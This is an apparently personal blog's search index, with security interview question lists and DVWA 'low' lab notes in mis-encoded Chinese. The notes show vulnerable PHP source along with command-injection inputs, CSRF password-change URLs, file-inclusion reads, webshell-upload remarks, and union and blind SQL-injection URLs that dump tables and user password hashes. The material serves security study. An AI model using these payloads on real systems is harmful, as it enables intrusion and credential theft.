<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>é¦–é¡µ</title>
    <url>/2022/10/01/%E9%A6%96%E9%A1%B5/</url>
    <content><![CDATA[<h2 id="ğŸŒ-Socials"><a href="#ğŸŒ-Socials" class="headerlink" title="ğŸŒ Socials"></a>ğŸŒ Socials</h2><p> <a href="https://juejin.cn/user/3153817156976791"><img src="https://img.shields.io/badge/%E6%8E%98%E9%87%91-%E6%8E%98%E9%87%91-blue" alt="æ˜é‡‘"></a> <a href="reph0r@foxmail.com"><img src="https://img.shields.io/badge/%E9%82%AE%E7%AE%B1-%E9%82%AE%E7%AE%B1-blueviolet" alt="é‚®ç®±"></a></p>
]]></content>
      <tags>
        <tag>é¦–é¡µ</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·±ä¿¡æœå®‰å…¨è¿è¥-æ ¡æ‹›-2023</title>
    <url>/2022/10/27/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E6%A0%A1%E6%8B%9B-2023/</url>
    <content><![CDATA[<p>å…¨ç¨‹å¤§æ¦‚å››ååˆ†é’Ÿå·¦å³ï¼š<br>SQLæ³¨å…¥æ¼æ´å¦‚ä½•æ¢æµ‹æ‰‹å·¥ã€å·¥å…·<br>ç½‘ç»œæ‹“æ‰‘å›¾ä¼šç”»å˜›ï¼Ÿ(æ²¡å¬è¯´è¿‡)<br>å†…ç½‘ç®€å•é—®äº†ä¸€ä¸‹<br>TCPåè®®<br>æ·±ä¿¡æœwaf ã€é˜²ç«å¢™ç­‰ç­‰çš„äº†è§£<br>Windowsç”µè„‘ä¸­æ¯’å¦‚ä½•åº”æ€¥å“åº”<br>å†™çš„å·¥å…·ï¼Œå…·ä½“é—®ä»€ä¹ˆåŸç†<br>å‰æ²¿æ¼æ´è¿›è¡Œè¿‡å¤ç°ä¸å­¦ä¹ å˜›<br>CTFå‚åŠ è¿‡å˜›ï¼Œåšè¿‡å“ªäº›é¢˜<br>æ¸—é€æµ‹è¯•ä¿¡æ¯æ”¶é›†<br>ä¸­é—´ä»¶æ¼æ´äº†è§£è¿‡å˜›<br>åœ¨æµè§ˆå™¨ä¸­è¾“å…¥urlåå›è½¦åä¼šå‘ç”Ÿå“ªäº›æ“ä½œ<br>sqlmapå·¥å…·çš„ä½¿ç”¨<br>æ—¥å¿—åˆ†æ<br>æ ¡å›­ç»å†<br>æ·±ä¿¡æœäº†è§£å˜›<br>æŠ•é€’è¿‡å…¶ä»–å…¬å¸å˜›ï¼Œä½ å¦‚ä½•é€‰æ‹©å…¥èŒçš„å…¬å¸<br>ä½ æœ‰å…¶ä»–é—®é¢˜å˜›ï¼Ÿ(åé—®)<br>å…¶ä»–çš„å¿˜äº†</p>
]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>é¢è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title>å¥‡å®‰ä¿¡æ¸—é€æµ‹è¯•2023ç¬”è¯•é¢˜</title>
    <url>/2022/10/27/%E5%A5%87%E5%AE%89%E4%BF%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%952023%E7%AC%94%E8%AF%95%E9%A2%98/</url>
    <content><![CDATA[<p>å¥‡å®‰ä¿¡ ç¬”è¯• æ¸—é€æµ‹è¯•2023<br>weblogic jboss iiså¸¸è§æ¼æ´ï¼Œ<br>åºåˆ—åŒ–ï¼Œ<br>ssrfå¯ä»¥åˆ©ç”¨å“ªäº›åè®®<br> SQLæ³¨å…¥åˆ†ç±»<br>csrfå±å®³<br>æ–‡ä»¶åŒ…å«æœ‰å“ªäº›å‡½æ•°<br>æ–‡ä»¶ä¸Šä¼ ä¹‹é»‘åå•<br>xssåˆ†ç±» xxeå¯ä»¥ä½¿ç”¨å“ªäº›åè®®<br>ä»£ç æ‰§è¡Œæœ‰å“ªäº›å‡½æ•°<br>mongdbé»˜è®¤ç«¯å£<br>redisç«¯å£<br>Javaåºåˆ—åŒ–å®ç°é‚£ä¸¤ä¸ªç±»<br>ä¼šè¯å›ºå®šæ”»å‡»æœ‰å“ªäº›<br>log4jæ¼æ´<br>redisæœªæˆæƒè®¿é—®æœ‰å“ªäº›åˆ©ç”¨æ–¹å¼<br>shiroæµé‡ç‰¹å¾<br>å“ªäº›è¯­è¨€å­˜åœ¨ååºåˆ—åŒ–æ¼æ´<br>nmapæ€æ ·è·å–ç‰ˆæœ¬(SV)</p>
]]></content>
      <categories>
        <category>ç¬”è¯•</category>
      </categories>
      <tags>
        <tag>ç¬”è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA-lowç¬”è®°</title>
    <url>/2022/10/01/DVWA-low%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Brute-Force-æš´åŠ›ç ´è§£"><a href="#Brute-Force-æš´åŠ›ç ´è§£" class="headerlink" title="Brute Force(æš´åŠ›ç ´è§£)"></a>Brute Force(æš´åŠ›ç ´è§£)</h1><p>ç®€å•ï¼šå‚è€ƒ<a href="https://juejin.cn/post/7119111677383032846">pikachué€šå…³å…¨è®°å½•</a> ä¸­çš„# 0x01 Burt Force(æš´åŠ›ç ´è§£æ¼æ´)ã€‚</p>
<h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>ä»æºä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œç”¨æˆ·é€šè¿‡è¾“å…¥pingå‘½ä»¤ï¼Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ç„¶åæ ¹æ®æœåŠ¡å™¨æ˜¯å¦æ˜¯Windows NTç³»ç»Ÿï¼Œå¯¹ç›®æ ‡ipè¿›è¡Œä¸åŒçš„pingæµ‹è¯•ã€‚</p>
<ul>
<li>8.142.189.231 || ipconfig  æ•ˆæœå¦‚ä¸‹ï¼š</li>
</ul>
</blockquote>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5f3a307943504ed09ea58a0f701609a7~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>è§‚å¯Ÿå…¶urlï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=%E6%94%B9%E5%8F%98#</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹æºä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>ä»æºä»£ç ä¸­ï¼Œæˆ‘ä»¬çœ‹å‡ºæ²¡æœ‰ä»»ä½•é˜²æŠ¤æªæ–½ï¼Œä¾‹å¦‚tokenã€éªŒè¯ç è¿™äº›ä¸œè¥¿éƒ½æ²¡æœ‰åŠ ï¼Œå®‰å…¨æ€§èƒ½ä½ã€‚åªéœ€è¦å°†é“¾æ¥å‘é€ç»™ç”¨æˆ·ç‚¹å‡»ï¼Œæ”»å‡»å³å¯å®Œæˆï¼</p>
</blockquote>
<h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><a href="http://127.0.0.1/dvwa/vulnerabilities/fi/?page=E:/phpstudy/WWW/123.txt">http://127.0.0.1/dvwa/vulnerabilities/fi/?page=E:/phpstudy/WWW/123.txt</a></li>
<li>è¯»å– wwwä¸‹çš„123.txtæ–‡ä»¶ï¼›</li>
<li>æ•ˆæœå¦‚ä¸‹ï¼š</li>
</ul>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7493944800b247baa095880e3c35da27~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<blockquote>
<p>ä»ä¸Šé¢å›¾ç‰‡å¯ä»¥çœ‹å‡ºé€šè¿‡è¯¥æ¼æ´å¯ä»¥è¿›è¡Œæ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨ï¼ŒåŒ…æ‹¬æœ¬åœ°æ–‡ä»¶åŒ…å«å’Œè¿œç¨‹æ–‡ä»¶åŒ…å«è¿›è¡Œæœ¬åœ°ä¿¡æ¯è¯»å–ç­‰ï¼Œè¿œç¨‹åŒ…å«shellç­‰æ“ä½œã€‚</p>
</blockquote>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/523682ec21dd4b33ace95194087ee2ac~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/070cee4476bd4ed58d8124b1978218e7~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<blockquote>
<p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆç›¸å¯¹è·¯å¾„ä¸è¡Œï¼Ÿè¯•äº†ä¸€ä¸‹è¿œç¨‹æ–‡ä»¶åŒ…å«æ²¡æœ‰æˆåŠŸï¼Œå¦‚æœæŠ›å¼€ç¯å¢ƒé—®é¢˜ï¼Œåº”è¯¥æ˜¯è¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚</p>
</blockquote>
<p>ä¿®å¤æ–¹æ¡ˆï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1.ç¦æ­¢è¿œç¨‹æ–‡ä»¶åŒ…å«allow_url_include=off</span><br><span class="line">2.é…ç½®open_basedir=æŒ‡å®šç›®å½•ï¼Œé™åˆ¶è®¿é—®åŒºåŸŸã€‚</span><br><span class="line">3.è¿‡æ»¤../ç­‰ç‰¹æ®Šç¬¦å·</span><br><span class="line">4.ä¿®æ”¹Apacheæ—¥å¿—æ–‡ä»¶çš„å­˜æ”¾åœ°å€</span><br><span class="line">5.å¼€å¯é­”æœ¯å¼•å·magic_quotes_qpc=on</span><br><span class="line">6.å°½é‡ä¸è¦ä½¿ç”¨åŠ¨æ€å˜é‡è°ƒç”¨æ–‡ä»¶ï¼Œç›´æ¥å†™è¦åŒ…å«çš„æ–‡ä»¶</span><br></pre></td></tr></table></figure>
<h1 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/768c5062317341b989bfc2b6e5668cdf~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<blockquote>
<p>æœªå¯¹ä¼ å…¥çš„æ–‡ä»¶åšè¿‡æ»¤ç­‰æ“ä½œï¼Œå¯ç›´æ¥ä¸Šä¼ PHPæ–‡ä»¶ï¼Œç›´æ¥åŒ…å«ä¸€å¥è¯ç”¨èœåˆ€æˆ–è€…èšå‰‘ç­‰å·¥å…·å³å¯ç›´æ¥è¿æ¥ã€‚æˆ–è€…ç”¨metasploitç”ŸæˆPHPæ–‡ä»¶ï¼Œå»è¿æ¥!!!</p>
</blockquote>
<h1 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a>Insecure CAPTCHA</h1><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8a322dc4bd384b878ee915628c057e91~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<ul>
<li>ç¯å¢ƒæ²¡æœ‰æ­å¥½ï¼Œä»¥åå†å¼„</li>
</ul>
<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">&lt;</span>?php</span><br><span class="line"></span><br><span class="line">if( isset( $_REQUEST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span> <span class="keyword">Get</span> input</span><br><span class="line">    $id <span class="operator">=</span> $_REQUEST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    switch ($_DVWA[<span class="string">&#x27;SQLI_DB&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> MYSQL:</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span> <span class="keyword">Check</span> database</span><br><span class="line">            $query  <span class="operator">=</span> &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br><span class="line">            $<span class="keyword">result</span> <span class="operator">=</span> mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) <span class="keyword">or</span> die( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res <span class="operator">=</span> mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span> <span class="keyword">Get</span> results</span><br><span class="line">            while( $<span class="type">row</span> <span class="operator">=</span> mysqli_fetch_assoc( $<span class="keyword">result</span> ) ) &#123;</span><br><span class="line">                <span class="operator">/</span><span class="operator">/</span> <span class="keyword">Get</span> <span class="keyword">values</span></span><br><span class="line">                $<span class="keyword">first</span> <span class="operator">=</span> $<span class="type">row</span>[&quot;first_name&quot;];</span><br><span class="line">                $<span class="keyword">last</span>  <span class="operator">=</span> $<span class="type">row</span>[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">                <span class="operator">/</span><span class="operator">/</span> Feedback <span class="keyword">for</span> <span class="keyword">end</span> <span class="keyword">user</span></span><br><span class="line">                echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">            break;</span><br><span class="line">        <span class="keyword">case</span> SQLITE:</span><br><span class="line">            <span class="keyword">global</span> $sqlite_db_connection;</span><br><span class="line"></span><br><span class="line">            #$sqlite_db_connection <span class="operator">=</span> <span class="keyword">new</span> SQLite3($_DVWA[<span class="string">&#x27;SQLITE_DB&#x27;</span>]);</span><br><span class="line">            #$sqlite_db_connection<span class="operator">-</span><span class="operator">&gt;</span>enableExceptions(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            $query  <span class="operator">=</span> &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br><span class="line">            #print $query;</span><br><span class="line">            try &#123;</span><br><span class="line">                $results <span class="operator">=</span> $sqlite_db_connection<span class="operator">-</span><span class="operator">&gt;</span>query($query);</span><br><span class="line">            &#125; catch (Exception $e) &#123;</span><br><span class="line">                echo <span class="string">&#x27;Caught exception: &#x27;</span> . $e<span class="operator">-</span><span class="operator">&gt;</span>getMessage();</span><br><span class="line">                exit();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if ($results) &#123;</span><br><span class="line">                while ($<span class="type">row</span> <span class="operator">=</span> $results<span class="operator">-</span><span class="operator">&gt;</span>fetchArray()) &#123;</span><br><span class="line">                    <span class="operator">/</span><span class="operator">/</span> <span class="keyword">Get</span> <span class="keyword">values</span></span><br><span class="line">                    $<span class="keyword">first</span> <span class="operator">=</span> $<span class="type">row</span>[&quot;first_name&quot;];</span><br><span class="line">                    $<span class="keyword">last</span>  <span class="operator">=</span> $<span class="type">row</span>[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">                    <span class="operator">/</span><span class="operator">/</span> Feedback <span class="keyword">for</span> <span class="keyword">end</span> <span class="keyword">user</span></span><br><span class="line">                    echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                echo &quot;Error in fetch &quot;.$sqlite_db<span class="operator">-</span><span class="operator">&gt;</span>lastErrorMsg();</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡ä»£ç åˆ†æï¼Œé€šè¿‡getä¼ å‚ï¼Œä¼ å…¥åç«¯æ‹¼æ¥åˆ°&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;æ‰§è¡Œ</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=2&#x27; and &#x27;1&#x27;=&#x27;1&amp;Submit=Submit#</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=2&#x27; and &#x27;1&#x27;=&#x27;2&amp;Submit=Submit#</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&#x27; order by 5--+&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">æŸ¥è¯¢å­—æ®µæ•°ï¼š</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27%20order%20by%202--+&amp;Submit=Submit#</span><br><span class="line">æŸ¥è¯¢æ“ä½œç³»ç»Ÿã€ç‰ˆæœ¬ï¼š</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=0%27%20union%20select%201,2--+&amp;Submit=Submit#</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2%27%20union%20select%20database(),version()%20--+&amp;Submit=Submit#</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2%27%20union%20select%20@@version_compile_os,version()%20--+&amp;Submit=Submit#</span><br><span class="line">- å¾—å‡ºæ•°æ®åº“åç§°ï¼š dvwa   ç‰ˆæœ¬å·ï¼š5.5.53   æ“ä½œç³»ç»Ÿï¼šWin32</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/09c51a63df3f409c8c1994b5cf8b10fa~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<blockquote>
<p>æŸ¥è¯¢å…¨éƒ¨æ•°æ®åº“åç§°ï¼š</p>
<p><a href="http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;</a> union select   group_concat(schema_name),1  from information_schema.schemata â€“+&amp;Submit&#x3D;Submit#</p>
</blockquote>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/cae954a523b34a11b1c46e1222f5c1cc~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<blockquote>
<p>æŸ¥è¯¢dvwaæ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨ï¼š</p>
<p><a href="http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;</a> union select   group_concat(table_name),1  from information_schema.tables where table_schema&#x3D;database() â€“+&amp;Submit&#x3D;Submit#</p>
<p>æˆ–è€…ï¼š</p>
<p><a href="http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;</a> union select   group_concat(table_name),1  from information_schema.tables where table_schema&#x3D;â€™dvwaâ€™ â€“+&amp;Submit&#x3D;Submit#</p>
</blockquote>
<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/68648b0e8a1d41b288b07897e721dbdc~tplv-k3u1fbpfcp-watermark.image" alt="å›¾ç‰‡.png"></p>
<blockquote>
<p>æŸ¥è¯¢æ‰€æœ‰ users è¡¨çš„å­—æ®µå</p>
<p><a href="http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;</a> union select   group_concat(column_name),1  from information_schema.columns where table_name&#x3D;â€™usersâ€™ â€“+&amp;Submit&#x3D;Submit#</p>
</blockquote>
<blockquote>
<p>æŸ¥è¯¢æ‰€æœ‰ users è¡¨çš„å­—æ®µå€¼<br><a href="http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;">http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=-2&#39;</a> union select   group_concat(user_id,0x3a,user,0x2c,password,0x3b),1  from users â€“+&amp;Submit&#x3D;Submit#</p>
</blockquote>
<h1 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿›è¡Œâ€™æ•°å­—å‹â€˜å’Œâ€™å­—ç¬¦å‹â€˜åˆ¤æ–­ï¼š</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1 and 1=3&amp;Submit=Submit#</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1%27%20and%20%271%27=%273&amp;Submit=Submit#</span><br><span class="line">http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1%27%20and%20%271%27=%271&amp;Submit=Submit#</span><br></pre></td></tr></table></figure>
<ul>
